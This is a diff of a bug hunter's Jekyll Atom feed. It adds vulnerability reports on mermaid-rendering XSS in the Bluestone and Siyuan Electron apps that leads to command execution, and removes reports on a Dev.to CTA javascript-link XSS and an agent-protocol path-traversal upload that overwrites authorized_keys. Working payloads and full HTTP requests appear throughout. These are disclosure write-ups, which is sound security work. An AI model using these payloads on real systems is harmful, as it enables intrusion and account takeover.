@@ -1,4 +1,91 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2024-06-02T21:34:36+08:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">XSS in Outline when rendering mermaid diagrams</title><link href="http://0.0.0.0:4000/xss/2024/06/02/xss-in-outline-render-mermaid-diagram.html" rel="alternate" type="text/html" title="XSS in Outline when rendering mermaid diagrams" /><published>2024-06-02T10:31:06+08:00</published><updated>2024-06-02T10:31:06+08:00</updated><id>http://0.0.0.0:4000/xss/2024/06/02/xss-in-outline-render-mermaid-diagram</id><content type="html" xml:base="http://0.0.0.0:4000/xss/2024/06/02/xss-in-outline-render-mermaid-diagram.html"><![CDATA[<h3 id="summary">Summary</h3>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2024-06-05T14:20:25+08:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">XSS in Bluestone Electron App when rendering mermaid class diagram Leading to RCE</title><link href="http://0.0.0.0:4000/xss/2024/06/04/xss-in-bluestone-render-mermaid-diagram.html" rel="alternate" type="text/html" title="XSS in Bluestone Electron App when rendering mermaid class diagram Leading to RCE" /><published>2024-06-04T10:31:06+08:00</published><updated>2024-06-04T10:31:06+08:00</updated><id>http://0.0.0.0:4000/xss/2024/06/04/xss-in-bluestone-render-mermaid-diagram</id><content type="html" xml:base="http://0.0.0.0:4000/xss/2024/06/04/xss-in-bluestone-render-mermaid-diagram.html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Due to outdated mermaid 10.0.2 is used to render diagrams, a XSS in class diagram is able to trigger, chained with insecure configuration of windows electron app, attacker is able to execute code in victims’ local system.</p>
+
+<h3 id="details">Details</h3>
+<p>Bluestone is using <a href="https://github.com/1943time/bluestone/blob/07535f86adebe8f7f00c299ca60792189eff2a64/package.json#L67">mermaid 10.0.2</a> to render mermaid diagram. <a href="https://github.com/Milkdown/milkdown/issues/1267#issuecomment-2018032986">This issue</a> have discussed the XSS in mermaid below 10.9.0 when rendering the node names of classDiagram. Specifically, The names of node are not fully sanitized which leads to  injection of XSS payload.</p>
+
+<p>Besides, the electron app sets <code class="language-plaintext highlighter-rouge">nodeIntegration</code> to <a href="https://github.com/1943time/bluestone/blob/07535f86adebe8f7f00c299ca60792189eff2a64/src/main/api.ts#L33"><code class="language-plaintext highlighter-rouge">true</code></a> which is harmful, according to <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/electron-desktop-apps#introduction">this attack</a>, a XSS can be escalated to execute command on victims’ local system.</p>
+
+<h3 id="poc">PoC</h3>
+
+<ol>
+  <li>
+    <p>Download latest Bluestone v0.22.0 windows electron app from <a href="https://github.com/1943time/bluestone/releases/download/v0.22.0/Bluestone-win-x64.exe">official repo</a>, and install the application:</p>
+  </li>
+  <li>
+    <p>Open the payload markdown file using the Bluestone app, the payload is following:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> classDiagram
+ Class01 &lt;|-- `AveryLngClas&lt;img src='x' onerror=require('child_process').exec('calc');&gt;`
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>The calculator poped up.</p>
+
+    <p><img src="/assets/images/mermaid/bluestone-rce.png" alt="rce" /></p>
+  </li>
+</ol>
+
+<h3 id="impact">Impact</h3>
+
+<p>Client side code execution.</p>
+
+<h3 id="reference">Reference</h3>
+
+<p><a href="https://github.com/Milkdown/milkdown/issues/1267#issuecomment-2018032986">https://github.com/Milkdown/milkdown/issues/1267#issuecomment-2018032986</a></p>
+
+<h3 id="occurence">Occurence</h3>
+
+<p><a href="https://github.com/1943time/bluestone/blob/07535f86adebe8f7f00c299ca60792189eff2a64/package.json#L67">https://github.com/1943time/bluestone/blob/07535f86adebe8f7f00c299ca60792189eff2a64/package.json#L67</a></p>
+
+<p><a href="https://github.com/1943time/bluestone/blob/07535f86adebe8f7f00c299ca60792189eff2a64/src/main/api.ts#L33">https://github.com/1943time/bluestone/blob/07535f86adebe8f7f00c299ca60792189eff2a64/src/main/api.ts#L33</a></p>
+
+<h3 id="mitigation">Mitigation</h3>
+
+<ol>
+  <li>Upgrade the mermaid to latest version which is <code class="language-plaintext highlighter-rouge">10.9.1</code>.</li>
+  <li>Disable <code class="language-plaintext highlighter-rouge">nodeIntegration</code> in electron app.</li>
+</ol>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Summary Due to outdated mermaid 10.0.2 is used to render diagrams, a XSS in class diagram is able to trigger, chained with insecure configuration of windows electron app, attacker is able to execute code in victims’ local system.]]></summary></entry><entry><title type="html">XSS in Siyuan Electron App when rendering mermaid block diagram Leading to RCE</title><link href="http://0.0.0.0:4000/xss/2024/06/04/xss-in-siyuan-render-mermaid-diagram.html" rel="alternate" type="text/html" title="XSS in Siyuan Electron App when rendering mermaid block diagram Leading to RCE" /><published>2024-06-04T10:31:06+08:00</published><updated>2024-06-04T10:31:06+08:00</updated><id>http://0.0.0.0:4000/xss/2024/06/04/xss-in-siyuan-render-mermaid-diagram</id><content type="html" xml:base="http://0.0.0.0:4000/xss/2024/06/04/xss-in-siyuan-render-mermaid-diagram.html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Due to outdated mermaid 10.8.0 is used to render block diagrams, a XSS in block diagram is able to trigger, chained with insecure configuration of windows electron app, attacker is able to execute code in victims local system.</p>
+
+<h3 id="details">Details</h3>
+<p>Siyuan is using <a href="https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/changelogs/v3.0.0/v3.0.0.md?plain=1#L30">mermaid 10.8.0</a> to render mermaid diagram. However, <a href="https://github.com/mermaid-js/mermaid/blob/d6ccd93cf207a30bbd45edf39fd29afdbb87b05e/cypress/platform/xss25.html#L98">the test html</a> in mermaid repo showed that the edge label names of <a href="https://github.com/mermaid-js/mermaid/pull/5221">new block diagram</a> is not sanitized and could lead to XSS. The name of node is not fully sanitized which leads to  injection of XSS payload.</p>
+
+<p>Besides, the electron app sets <code class="language-plaintext highlighter-rouge">nodeIntegration</code> to <a href="https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/electron/main.js#L305"><code class="language-plaintext highlighter-rouge">true</code></a> which is harmful, according to <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/electron-desktop-apps#introduction">this attack</a>, a XSS can be escalated to execute command on victims’ local system.</p>
+
+<h3 id="poc">PoC</h3>
+
+<ol>
+  <li>
+    <p>Download latest Siyuan-3.0.17 windows electron app from <a href="https://release.liuyun.io/siyuan/siyuan-3.0.17-win.exe">official site</a>, and install the application:</p>
+  </li>
+  <li>Create new document, and type <code class="language-plaintext highlighter-rouge">/Mermaid</code> command to insert mermaid diagram using following payload:
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  block-beta
+  `A-- "X&lt;img src=x onerror=require('child_process').exec('calc');&gt;" --&gt;B
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>The calculator poped up.</p>
+
+    <p><img src="/assets/images/mermaid/siyuan-rce.png" alt="rce" /></p>
+  </li>
+</ol>
+
+<h3 id="impact">Impact</h3>
+
+<p>Client side code execution.</p>
+
+<h3 id="reference">Reference</h3>
+
+<p><a href="https://github.com/siyuan-note/siyuan/issues/11645">https://github.com/siyuan-note/siyuan/issues/11645</a></p>
+
+<p><a href="https://github.com/mermaid-js/mermaid/blob/d6ccd93cf207a30bbd45edf39fd29afdbb87b05e/cypress/platform/xss25.html#L98">https://github.com/mermaid-js/mermaid/blob/d6ccd93cf207a30bbd45edf39fd29afdbb87b05e/cypress/platform/xss25.html#L98</a></p>
+
+<h3 id="occurence">Occurence</h3>
+
+<p><a href="https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/electron/main.js#L305">https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/electron/main.js#L305</a></p>
+
+<p><a href="https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/changelogs/v3.0.0/v3.0.0.md?plain=1#L30">https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/changelogs/v3.0.0/v3.0.0.md?plain=1#L30</a></p>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Summary Due to outdated mermaid 10.8.0 is used to render block diagrams, a XSS in block diagram is able to trigger, chained with insecure configuration of windows electron app, attacker is able to execute code in victims local system.]]></summary></entry><entry><title type="html">XSS in Outline when rendering mermaid diagrams</title><link href="http://0.0.0.0:4000/xss/2024/06/02/xss-in-outline-render-mermaid-diagram.html" rel="alternate" type="text/html" title="XSS in Outline when rendering mermaid diagrams" /><published>2024-06-02T10:31:06+08:00</published><updated>2024-06-02T10:31:06+08:00</updated><id>http://0.0.0.0:4000/xss/2024/06/02/xss-in-outline-render-mermaid-diagram</id><content type="html" xml:base="http://0.0.0.0:4000/xss/2024/06/02/xss-in-outline-render-mermaid-diagram.html"><![CDATA[<h3 id="summary">Summary</h3>
 <p>Due to outdated mermaid plugin is used to render diagrams, a known XSS in mermaid classDiagram is able to trigger in outline mermaid diagram.</p>
 
 <h3 id="details">Details</h3>
@@ -1151,213 +1238,4 @@ turbinia:x:999:999::/home/turbinia:/sbin/nologin
 
 <h2 id="occurrences">Occurrences</h2>
 
-<p><a href="https://github.com/google/turbinia/blob/1da2d19f9b79dac8df37bdf2ed4f9d5d0797607b/turbinia/api/routes/ui.py#L53">https://github.com/google/turbinia/blob/1da2d19f9b79dac8df37bdf2ed4f9d5d0797607b/turbinia/api/routes/ui.py#L53</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Dev.to(Forem) cta xss</title><link href="http://0.0.0.0:4000/xss/2024/04/30/xss-devto.html" rel="alternate" type="text/html" title="Dev.to(Forem) cta xss" /><published>2024-04-30T10:26:18+08:00</published><updated>2024-04-30T10:26:18+08:00</updated><id>http://0.0.0.0:4000/xss/2024/04/30/xss-devto</id><content type="html" xml:base="http://0.0.0.0:4000/xss/2024/04/30/xss-devto.html"><![CDATA[<h2 id="name">Name</h2>
-
-<blockquote>
-  <p>Dev.to(Forem) cta xss</p>
-</blockquote>
-
-<h2 id="weakness">Weakness</h2>
-
-<blockquote>
-  <p>XSS</p>
-</blockquote>
-
-<h2 id="severity">Severity</h2>
-<blockquote>
-  <p>Medium</p>
-</blockquote>
-
-<h2 id="summary">Summary</h2>
-
-<p>DEV is a community of software developers which is built on <a href="https://github.com/forem">Forem</a>: open source software designed to empower communities. You can edit your blog with its buildin markdown editor using liquid markdown syntax.</p>
-
-<p>For example, <a href="https://dev.to/devteam/lesser-known-features-of-dev-embedding-call-to-action-cta-buttons-2gni">CTA</a> uses 
-<code class="language-plaintext highlighter-rouge">{% cta link %} desc {% endcta %}</code>
- to create a button with a link to jump to. However, the backend didn’t sanitize <code class="language-plaintext highlighter-rouge">javascript</code> link, causing click xss.</p>
-
-<h4 id="trigger">Trigger</h4>
-<ol>
-  <li>
-    <p>Create a post or comment, in the editor, send following payload:</p>
-
-    <p><code class="language-plaintext highlighter-rouge">{% cta javascript:alert(document.domain) %} clickme {% endcta %}</code></p>
-
-    <p><img src="/assets/images/bughunter/dev1.png" alt="dev1" /></p>
-
-    <p><img src="/assets/images/bughunter/dev-com1.png" alt="dev1" /></p>
-  </li>
-  <li>
-    <p>After payload sent, a button is rendered, click the button, the xss is triggered!</p>
-
-    <p><img src="/assets/images/bughunter/dev2.png" alt="dev2" /></p>
-
-    <p><img src="/assets/images/bughunter/dev3.png" alt="dev3" /></p>
-
-    <p><img src="/assets/images/bughunter/dev-com2.png" alt="dev2" /></p>
-
-    <p><img src="/assets/images/bughunter/dev-com3.png" alt="dev3" /></p>
-  </li>
-  <li>
-    <p>Using chrome dev tools to check the rendered result:</p>
-
-    <p><img src="/assets/images/bughunter/dev-com4.png" alt="dev4" /></p>
-  </li>
-</ol>
-
-<h3 id="root-cause">Root cause</h3>
-
-<p>Forem codebase:</p>
-
-<p><a href="https://github.com/forem/forem/blob/7c3e5b2b999f3cc830b02a2ec21735cc464bf16d/app/views/liquids/_cta.html.erb#L1">_cta.html.erb</a></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;a href="&lt;%= link %&gt;" class="ltag_cta ltag_cta--&lt;%= type %&gt;" role="button"&gt;&lt;%= description %&gt;&lt;/a&gt;
-</code></pre></div></div>
-
-<p><a href="https://github.com/forem/forem/blob/7c3e5b2b999f3cc830b02a2ec21735cc464bf16d/app/liquid_tags/cta_tag.rb#L21">render cta_tag</a></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def render(_context)
-    content = Nokogiri::HTML.parse(super)
-
-    ApplicationController.render(
-      partial: PARTIAL,
-      locals: {
-        link: @link,
-        description: sanitized_description(content),
-        type: TYPE_OPTIONS.first
-      },
-    )
-  end
-</code></pre></div></div>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in agent-protocol</title><link href="http://0.0.0.0:4000/file-overwrite/2024/04/10/remote-code-execution-via-afo-using-path-traversal-in-agent-protol.html" rel="alternate" type="text/html" title="Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in agent-protocol" /><published>2024-04-10T10:31:06+08:00</published><updated>2024-04-10T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/04/10/remote-code-execution-via-afo-using-path-traversal-in-agent-protol</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/04/10/remote-code-execution-via-afo-using-path-traversal-in-agent-protol.html"><![CDATA[<h2 id="name">Name</h2>
-
-<blockquote>
-  <p>Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in agent-protocol</p>
-</blockquote>
-
-<h2 id="weakness">Weakness</h2>
-
-<blockquote>
-  <p>CWE-22: Path Traversal</p>
-</blockquote>
-
-<h2 id="severity">Severity</h2>
-
-<blockquote>
-  <p>High (8.8)</p>
-</blockquote>
-
-<h2 id="description">Description</h2>
-
-<p>The <code class="language-plaintext highlighter-rouge">/ap/v1/agent/tasks//artifacts</code> endpoint in the agent-protocol python API is vulnerable to a path traversal vulnerability through the <code class="language-plaintext highlighter-rouge">filename</code> parameter which allows the uploading of arbitrary files. An attacker can upload and overwrite ANY file on the filesystem. This can lead to remote code execution in many different ways.</p>
-
-<h2 id="proof-of-concept">Proof of Concept</h2>
-
-<p>In this proof of concept, we will be gaining remote code execution by uploading our SSH key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file. There are many other ways to achieve remote code execution via a file upload, such as overwriting binaries, writing to .bashrc, ….</p>
-
-<p>We proof this vulnerability by logging into the <code class="language-plaintext highlighter-rouge">kali</code> user running the agent-protocol python API and checking that at this moment the <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> file does not exist.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
-cat: /home/kali/.ssh/authorized_keys: No such file or directory
-</code></pre></div></div>
-
-<p>An attacker can now send the following request to the webserver. This request will upload the attacker’s public RSA key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file.</p>
-
-<p>We start a simple server using example from <a href="https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/examples/minimal.py">https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/examples/minimal.py</a>:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from agent_protocol import Agent, Task, Step
-
-async def task_handler(task: Task) -&gt; None:
-    print(f"task: {task.input}")
-    await Agent.db.create_step(task.task_id, task.input)
-
-async def step_handler(step: Step) -&gt; Step:
-    print(f"step: {step.input}")
-    await Agent.db.create_step(step.task_id, f"Next step from step {step.name}")
-    step.output = step.input
-    return step
-
-Agent.setup_agent(task_handler, step_handler).start()
-</code></pre></div></div>
-<p>Start server:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python mimimal.py
-</code></pre></div></div>
-
-<p>Then, create a task and get taskid:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:8000/ap/v1/agent/tasks HTTP/1.1
-Content-Type: application/json
-User-Agent: PostmanRuntime/7.37.0
-Accept: */*
-Postman-Token: 6d1b6f21-1923-4517-9073-6097d87e9668
-Host: 127.0.0.1:8000
-Accept-Encoding: gzip, deflate
-Connection: close
-Content-Length: 61
-
-{
-    "input": "test"
-}
-</code></pre></div></div>
-
-<p>Using taskid we created and upload <code class="language-plaintext highlighter-rouge">authorized_keys</code> file, set filename to <code class="language-plaintext highlighter-rouge">../../../../../../../../../home/kali/.ssh/authorized_keys</code></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:8000/ap/v1/agent/tasks/91225126-2e71-42c2-9389-edbe4dd16d31/artifacts HTTP/1.1
-Content-Type: multipart/form-data; boundary=--------------------------590741319467185743628097
-User-Agent: PostmanRuntime/7.37.0
-Accept: */*
-Postman-Token: 591713fe-b29e-4e94-b467-f8989f921b54
-Host: 127.0.0.1:8000
-Accept-Encoding: gzip, deflate
-Connection: close
-Content-Length: 2368
-
-----------------------------590741319467185743628097
-Content-Disposition: form-data; name="file"; filename="../../../../../../../../../home/kali/.ssh/authorized_keys"
-Content-Type: application/javascript
-
-ssh-rsa AAAAB3NzaC1yc2EAAAADAR0AgOOiNtyaS9q8ObZhZmfDzcpIdDr14J83LRPJJ1ht1wFs+fXJwShzuXM7RtnKMu0cf3dN1iLbZeuwvgegowBI8iUoF9QR/k8QNSHEmnk4ZbN6WzgoQeeVc/I3C6PyD/4afMsQRU6fzij8BwDIHcQccEKsDvJ/xvDZXEbn2I5XIlPUAzYwslk= 11593@samurai
-----------------------------590741319467185743628097--
-</code></pre></div></div>
-
-<p>The response indicates success with artifact file path.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 
-Content-Length: 169
-Connection: keep-alive
-Content-Type: application/json
-Date: Wed, 10 Apr 2024 06:38:25 GMT
-Keep-Alive: timeout=4
-Proxy-Connection: keep-alive
-Server: hypercorn-h11
-
-{"artifact_id":"65c004cd-e7cf-4d4b-8009-cc775889c86e","agent_created":false,"file_name":"../../../../../../../../../home/kali/.ssh/authorized_keys","relative_path":null}
-</code></pre></div></div>
-
-<p>We can verify the success by again checking the /home/kali/.ssh/authorized_keys file.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDb+p1vHNh3CdWiOt+1DDptHOL+Rs7/YeRmjALSIqEMw2XUXG7+dRpSKc7VNT+DaliwSUIU0KPIacKQsMq9sLE/rPmtKYSuNBUhF2LccqjtUkri/lWZjLvJUyidFeAc7jabbG2JvuMzxbAMy4uxYGHQm+4MuGymeBJIyYKaUa9fuMHE2UNqGkvANgh6WLdEGTpPf52rHPnhab6PRd5DzYDJxk/W0Lci+BSUDi+8b5xSxX6GMRTn74zy6AnyktP5+xmnetlkHxAEGLBppE9bInIsc/feCqXiH7Eeq6t8WR0AgOOiNtyaS9q8ObZhZmfDzcpIdDr14J83LRPJJ1ht1wFs+fXJwShzuXM7RtnKMu0cf3dN1iLbZeuwvgtOBQDLRa6AxN5JxskvY+hP3Tsz3FUf5TA9ckegowBI8iUoF9QR/k8QNSHEmnk4ZbN6WzgoQeeVc/I3C6PyD/4afMsQRU6fzij8BwDIHcQccEKsDvJ/xvDZXEbn2I5XIlPUAzYwslk= 11593@samurai
-</code></pre></div></div>
-
-<h2 id="impact">Impact</h2>
-
-<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>
-
-<p>Warning: this bug also affects <a href="https://github.com/smol-ai/developer">smol.ai</a></p>
-
-<h3 id="ssh-access">SSH Access</h3>
-
-<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>
-
-<h3 id="web-servers">Web Servers</h3>
-
-<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>
-
-<h2 id="reference">Reference</h2>
-
-<p><a href="https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e">https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e</a></p>
-
-<h2 id="occurrences">Occurrences</h2>
-
-<p><a href="https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/agent_protocol/agent.py#L188C49-L188C58">https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/agent_protocol/agent.py#L188C49-L188C58</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
+<p><a href="https://github.com/google/turbinia/blob/1da2d19f9b79dac8df37bdf2ed4f9d5d0797607b/turbinia/api/routes/ui.py#L53">https://github.com/google/turbinia/blob/1da2d19f9b79dac8df37bdf2ed4f9d5d0797607b/turbinia/api/routes/ui.py#L53</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
